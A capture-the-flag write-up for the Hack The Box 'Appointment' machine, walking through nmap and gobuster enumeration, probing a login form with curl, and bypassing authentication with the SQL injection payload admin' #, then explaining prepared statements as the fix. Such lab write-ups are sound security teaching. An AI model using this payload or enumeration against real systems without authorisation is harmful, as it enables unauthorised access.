# Hack The Box - Appointment

## Machine Information

| Item | Value |
|------|-------|
| Machine | Appointment |
| Difficulty | Very Easy |
| Operating System | Linux |
| Target IP | 10.129.173.133 |

---

# Objective

- Enumerate the target.
- Identify the exposed service.
- Analyze the web application.
- Understand the vulnerability.
- Gain access.
- Retrieve the flag.

---

# Methodology

```
Reconnaissance
      │
      ▼
Port Scanning
      │
      ▼
Web Enumeration
      │
      ▼
Login Analysis
      │
      ▼
Vulnerability Analysis
      │
      ▼
Authentication Bypass
      │
      ▼
Retrieve Flag
```

---

# 1. Reconnaissance

## Full TCP Scan

Command

```bash
nmap -Pn -p- -sV -T4 10.129.173.133 | tee nmap.txt
```

Result

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38
```

### Finding

Only one service is exposed:

- HTTP (Apache 2.4.38)

---

# 2. Web Enumeration

## Browse the Website

Navigate to:

```
http://10.129.173.133
```

Main page:

```
Login Form
```

Available fields:

- Username
- Password
- Remember Me

---

## Directory Enumeration

Tool

```
Gobuster
```

Wordlist

```
/snap/seclists/current/Discovery/Web-Content/common.txt
```

Command

```bash
gobuster dir \
-u http://10.129.173.133 \
-w /snap/seclists/current/Discovery/Web-Content/common.txt
```

Result

```text
.htaccess
.htpasswd
.hta
css/
fonts/
images/
js/
vendor/
index.php
server-status
```

### Analysis

Interesting findings:

- PHP application
- Vendor directory
- Login page located in `index.php`

---

# 3. HTTP Analysis

Retrieve the page source.

Command

```bash
curl http://10.129.173.133
```

The login form sends data using:

```html
<form method="post">
```

Parameters discovered:

```
username
password
```

The request is sent to the same page because no `action` attribute is specified.

---

# 4. Login Testing

Send test credentials.

Command

```bash
curl -i -X POST \
-d "username=test&password=test" \
http://10.129.173.133/
```

Result

```
HTTP/1.1 200 OK
```

The login page is returned again.

### Analysis

The application processes authentication through a POST request.

This makes the login form a potential attack surface.

---

# 5. Vulnerability Analysis

The application is vulnerable to **SQL Injection Authentication Bypass**.

Suppose the backend executes a query similar to:

```sql
SELECT *
FROM users
WHERE username='$username'
AND password='$password';
```

Normal input

```
Username: admin
Password: admin123
```

Produces

```sql
SELECT *
FROM users
WHERE username='admin'
AND password='admin123';
```

---

# 6. Authentication Bypass

Payload

```
Username:
admin' #

Password:
anything
```

The generated query becomes:

```sql
SELECT *
FROM users
WHERE username='admin' #'
AND password='anything';
```

In MySQL,

```sql
#
```

starts a comment.

Everything after `#` is ignored.

The database effectively executes:

```sql
SELECT *
FROM users
WHERE username='admin';
```

The password comparison is removed, allowing authentication to succeed.

---

# Why It Works

The application inserts user input directly into the SQL query.

Because input is treated as SQL syntax instead of plain data, an attacker can change the logic of the query.

This vulnerability is known as:

```
SQL Injection (SQLi)
```

More specifically:

```
Authentication Bypass
```

---

# Root Cause

Unsafe query construction.

Example of vulnerable PHP code:

```php
$sql = "SELECT *
FROM users
WHERE username='$username'
AND password='$password'";
```

The application concatenates user input into SQL.

---

# Secure Implementation

Modern applications should use **Prepared Statements**.

Example:

```php
$stmt = $pdo->prepare(
"SELECT *
FROM users
WHERE username = ?
AND password = ?"
);

$stmt->execute([$username, $password]);
```

Prepared statements separate:

- SQL code
- User data

This prevents SQL Injection.

---

# Concepts Learned

## SQL Injection

Occurs when user input changes the structure of a SQL query.

---

## Authentication Bypass

Instead of stealing data, the attacker bypasses login authentication.

---

## HTTP POST

The login form submits credentials using:

```
POST /
```

Parameters:

```
username
password
```

---

## Web Enumeration

Tools used:

- Browser
- curl
- Gobuster
- Nmap

---

# Commands Learned

## Nmap

```bash
nmap -Pn -p- -sV -T4 TARGET
```

---

## Directory Enumeration

```bash
gobuster dir \
-u http://TARGET \
-w /snap/seclists/current/Discovery/Web-Content/common.txt
```

---

## Retrieve HTML

```bash
curl http://TARGET
```

---

## Send POST Request

```bash
curl -X POST \
-d "username=test&password=test" \
http://TARGET
```

---

# Attack Workflow

```
Target
    │
    ▼
Nmap
    │
    ▼
HTTP Service
    │
    ▼
Open Website
    │
    ▼
Identify Login Form
    │
    ▼
Analyze HTTP Request
    │
    ▼
Test Authentication
    │
    ▼
Identify SQL Injection
    │
    ▼
Authentication Bypass
    │
    ▼
Retrieve Flag
```

---

# Lessons Learned

- Always enumerate before exploiting.
- Login forms are common SQL Injection targets because they interact with databases.
- Gobuster helps discover hidden directories and files.
- `curl` is useful for inspecting HTTP requests and responses.
- SQL Injection happens when user input is interpreted as SQL code.
- Prepared Statements are the proper defense against SQL Injection.
- Modern frameworks usually provide parameter binding, but developers must use it correctly.

---

# Skills Gained

- Web Enumeration
- HTTP Basics
- HTML Form Analysis
- POST Request Analysis
- SQL Injection Fundamentals
- Authentication Bypass
- Secure Query Design
- Prepared Statements

---

# Machine Summary

| Category | Result |
|----------|--------|
| Target | 10.129.173.133 |
| Service | HTTP |
| Web Server | Apache 2.4.38 |
| Vulnerability | SQL Injection |
| Exploitation | Authentication Bypass |
| Flag Retrieved | ✅ |
| Machine Status | Completed |